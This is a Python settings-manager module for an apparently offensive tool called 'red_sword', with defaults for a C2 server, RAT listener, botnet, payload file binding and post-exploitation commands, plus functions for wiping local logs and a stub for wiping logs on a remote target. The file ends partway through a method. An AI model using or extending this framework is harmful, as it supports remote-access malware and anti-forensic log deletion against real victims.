import logging
import json
import os
from typing import Dict, Any, List, Callable, Union
import ipaddress
import re
from enum import Enum
import asyncio

class SettingType(Enum):
    STRING = "string"
    INTEGER = "integer"
    BOOLEAN = "boolean"
    LIST = "list"
    DICT = "dict"

class SettingsManager:
    def __init__(self, logger: logging.Logger, settings_file="red_sword_settings.json", default_settings_source=None):
        self.logger = logger
        self.settings = {}
        self.settings_file = settings_file
        self.default_settings = self._load_default_settings(default_settings_source)
        self.change_hooks = {}
        self.dashboard_update_callback = None
        self.load_settings()

    def _load_default_settings(self, source):
        if source is None:
            return {
                "log_level": {"value": "INFO", "description": "Logging level (DEBUG, INFO, WARNING, ERROR, CRITICAL)", "type": SettingType.STRING, "category": "General", "read_only": False, "options": ["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"]},
                "c2_server_ip": {"value": "127.0.0.1", "description": "C2 server IP address", "type": SettingType.STRING, "category": "C2 Server", "read_only": False, "placeholder": "0.0.0.0"},
                "c2_server_port": {"value": 8080, "description": "C2 server port", "type": SettingType.INTEGER, "category": "C2 Server", "read_only": False, "min": 1, "max": 65535, "placeholder": "1-65535"},
                "defcon_level": {"value": 5, "description": "DEFCON level (1-5)", "type": SettingType.INTEGER, "category": "General", "read_only": False, "min": 1, "max": 5, "placeholder": "1-5"},
                "tor_enabled": {"value": False, "description": "Enable Tor", "type": SettingType.BOOLEAN, "category": "Network", "read_only": False},
                "proxy_enabled": {"value": False, "description": "Enable Proxy", "type": SettingType.BOOLEAN, "category": "Network", "read_only": False},
                "dns_enabled": {"value": False, "description": "Enable DNS", "type": SettingType.BOOLEAN, "category": "Network", "read_only": False},
                "botnet_enabled": {"value": False, "description": "Enable Botnet", "type": SettingType.BOOLEAN, "category": "Botnet", "read_only": False},
                "allowed_ips": {"value": ["127.0.0.1", "::1"], "description": "List of allowed IP addresses", "type": SettingType.LIST, "category": "Network", "read_only": False, "placeholder": "IP Address"},
                "api_keys": {"value": {}, "description": "API keys for various services", "type": SettingType.DICT, "category": "General", "read_only": False},
                "modules_enabled": {"value": [], "description": "List of enabled modules", "type": SettingType.LIST, "category": "Modules", "read_only": False},
                "rat_port": {"value": 4444, "description": "RAT port", "type": SettingType.INTEGER, "category": "RAT", "read_only": False, "min": 1, "max": 65535, "placeholder": "1-65535"},
                "rat_host": {"value": "0.0.0.0", "description": "RAT host", "type": SettingType.STRING, "category": "RAT", "read_only": False, "placeholder": "0.0.0.0"},
                "wifi_interface": {"value": "wlan0", "description": "WiFi interface", "type": SettingType.STRING, "category": "Network", "read_only": False, "placeholder": "wlan0"},
                "imsi_interface": {"value": "gsm0", "description": "IMSI interface", "type": SettingType.STRING, "category": "Network", "read_only": False, "placeholder": "gsm0"},
                "crawler_user_agent": {"value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "description": "User agent for web crawler", "type": SettingType.STRING, "category": "Crawler", "read_only": False, "placeholder": "User Agent String"},
                "steganography_key": {"value": "default_key", "description": "Steganography key", "type": SettingType.STRING, "category": "Steganography", "read_only": False, "placeholder": "Key"},
                "post_exploitation_commands": {"value": [], "description": "List of post-exploitation commands", "type": SettingType.LIST, "category": "Post Exploitation", "read_only": False, "placeholder": "Command"},
                "file_binding_target": {"value": "", "description": "File binding target", "type": SettingType.STRING, "category": "File Binding", "read_only": False, "placeholder": "Target File"},
                "file_binding_output": {"value": "", "description": "File binding output", "type": SettingType.STRING, "category": "File Binding", "read_only": False, "placeholder": "Output File"},
                "file_binding_icon": {"value": "", "description": "File binding icon", "type": SettingType.STRING, "category": "File Binding", "read_only": False, "placeholder": "Icon File"},
                "file_binding_payload": {"value": "", "description": "File binding payload", "type": SettingType.STRING, "category": "File Binding", "read_only": False, "placeholder": "Payload File"},
            }
        elif isinstance(source, str):
            try:
                with open(source, "r") as f:
                    return json.load(f)
            except (FileNotFoundError, json.JSONDecodeError) as e:
                self.logger.error(f"Error loading default settings from {source}: {e}, using built-in defaults")
                return self._load_default_settings(None)
        elif isinstance(source, dict):
            return source
        else:
            self.logger.error(f"Invalid default settings source: {source}, using built-in defaults")
            return self._load_default_settings(None)

    def load_settings(self):
        if os.path.exists(self.settings_file):
            try:
                with open(self.settings_file, "r") as f:
                    loaded_settings = json.load(f)
                    for key, value in loaded_settings.items():
                        if key in self.default_settings:
                            self.settings[key] = value
                    self.logger.info(f"Settings loaded from {self.settings_file}")
                    self._validate_settings()
            except (json.JSONDecodeError, Exception) as e:
                self.logger.error(f"Error loading settings: {e}, loading default settings")
                self.settings = {key: item["value"] for key, item in self.default_settings.items()}
                self.save_settings()
        else:
            self.settings = {key: item["value"] for key, item in self.default_settings.items()}
            self.save_settings()
            self.logger.info(f"Default settings loaded and saved to {self.settings_file}")
        self._apply_env_overrides()

    def save_settings(self):
        try:
            with open(self.settings_file, "w") as f:
                json.dump(self.settings, f, indent=4)
            self.logger.info(f"Settings saved to {self.settings_file}")
            if self.dashboard_update_callback:
                asyncio.create_task(self._async_dashboard_update())
        except Exception as e:
            self.logger.error(f"Error saving settings: {e}")

    def get_setting(self, key: str) -> Any:
        return self.settings.get(key)

    def set_setting(self, key: str, value: Any):
        if key in self.default_settings and not self.default_settings[key].get("read_only", False):
            if self._validate_setting_value(key, value):
                self.settings[key] = value
                self.save_settings()
                self.logger.info(f"Setting '{key}' updated to '{value}'")
                self._execute_change_hooks(key, value)
            else:
                self.logger.warning(f"Invalid value for setting '{key}'.")
        elif key in self.default_settings and self.default_settings[key].get("read_only", False):
            self.logger.warning(f"Setting '{key}' is read-only and cannot be modified.")
        else:
            self.logger.warning(f"Setting '{key}' is not a valid setting.")

    def display_settings(self):
        print("----- Settings -----")
        for key, value in self.settings.items():
            description = self.default_settings.get(key, {}).get("description", "No description")
            print(f"  {key}: {value}  ({description})")
        print("--------------------")

    def sanitize_local_logs(self):
        log_file = "red_sword.log"
        try:
            if os.path.exists(log_file):
                with open(log_file, "w") as f:
                    f.write("")
                self.logger.info(f"Local logs sanitized in {log_file}")
            else:
                self.logger.warning(f"Log file not found: {log_file}")
        except Exception as e:
            self.logger.error(f"Error sanitizing local logs: {e}")

    def sanitize_remote_logs(self, target: str):
        # Placeholder for remote log sanitization logic
        self.logger.info(f"Sanitizing remote logs on {target}")
        # In a real scenario, this would involve connecting to the remote system
        # and deleting or overwriting log files.
        self.logger.info(f"Remote logs sanitized on {target}")

    def _validate_settings(self):
        """Validates the loaded settings, correcting any invalid values."""
        for key, setting_data in self.default_settings.items():
            value = self.settings.get(key)
            if value is None:
                self.settings[key] = setting_data["value"]
                self.logger.warning(f"Setting '{key}' not found, resetting to default.")
                continue

            if not self._validate_setting_value(key, value):
                self.settings[key] = setting_data["value"]
                self.logger.warning(f"Invalid value for setting '{key}', resetting to default.")

    def _validate_setting_value(self, key: str, value: Any) -> bool:
        setting_data = self.default_settings.get(key)
        if not setting_data:
            return False

        setting_type = setting_data.get("type")
        if setting_type == SettingType.STRING:
            if not isinstance(value, str):
                return False
            if "regex" in setting_data and not re.match(setting_data["regex"], value):
                return False
        elif setting_type == SettingType.INTEGER:
            if not isinstance(value, int):
                return False
            if "min" in setting_data and value < setting_data["min"]:
                return False
            if "max" in setting_data and value > setting_data["max"]:
                return False
        elif setting_type == SettingType.BOOLEAN and not isinstance(value, bool):
            return False
        elif setting_type == SettingType.LIST and not isinstance(value, list):
            return False
        elif setting_type == SettingType.DICT and not isinstance(value, dict):
            return False

        if "custom_validation" in setting_data:
            try:
                if not setting_data["custom_validation"](value):
                    return False
            except Exception as e:
                self.logger.error(f"Error during custom validation for '{key}': {e}")
                return False
        return True

    def register_change_hook(self, key: str, hook: Callable):
        if key not in self.change_hooks:
            self.change_hooks[key] = []
        self.change_hooks[key].append(hook)

    def _execute_change_hooks(self, key: str, value: Any):
        if key in self.change_hooks:
            for hook in self.change_hooks[key]:
                try:
                    hook(key, value)
                except Exception as e:
                    self.logger.error(f"Error executing change hook for '{key}': {e}")

    def _apply_env_overrides(self):
        """Applies environment variable overrides to settings."""
        for key in self.default_settings:
            env_key = f"RED_SWORD_{key.upper()}"
            if env_key in os.environ:
                env_value = os.environ[env_key]
                try:
                    if isinstance(self.default_settings[key]["value"], int):
                        self.settings[key] = int(env_value)
                    elif isinstance(self.default_settings[key]["value"], bool):
                        self.settings[key] = env_value.lower() == "true"
                    elif isinstance(self.default_settings[key]["value"], list):
                        self.settings[key] = json.loads(env_value)
                    else:
                        self.settings[key] = env_value
                    self.logger.info(f"Setting '{key}' overridden by environment variable '{env_key}'")
                except Exception as e:
                    self.logger.error(f"Error overriding setting '{key}' with environment variable '{env_key}': {e}")

    def export_settings(self, file_path: str):
        try:
            with open(file_path, "w") as f:
                json.dump(self.settings, f, indent=4)
            self.logger.info(f"Settings exported to {file_path}")
        except Exception as e:
            self.logger.error(f"Error exporting settings: {e}")

    def import_settings(self, file_path: str):
        try:
            with open(file_path, "r") as f:
                loaded_settings = json.load(f)
                for key, value in loaded_settings.items():
                    if key in self.default_settings:
                        self.settings[key] = value
                self.logger.info(f"Settings imported from {file_path}")
                self._validate_settings()
                self.save_settings()
        except (FileNotFoundError, json.JSONDecodeError, Exception) as e:
            self.logger.error(f"Error importing settings from {file_path}: {e}")

    def reset_setting_to_default(self, key: str):
        if key in self.default_settings:
            self.settings[key] = self.default_settings[key]["value"]
            self.save_settings()
            self.logger.info(f"Setting '{key}' reset to default.")
        else:
            self.logger.warning(f"Setting '{key}' is not a valid setting.")

    def reset_all_settings(self):
        for key in self.default_settings:
            self.settings[key] = self.default_settings[key]["value"]
        self.save_settings()
        self.logger.info("All settings reset to default.")

    def get_dashboard_settings(self) -> Dict[str, Dict[str, Any]]:
        """
        Returns a dictionary of settings formatted for dashboard display.
        Each setting includes its value, description, type.
        """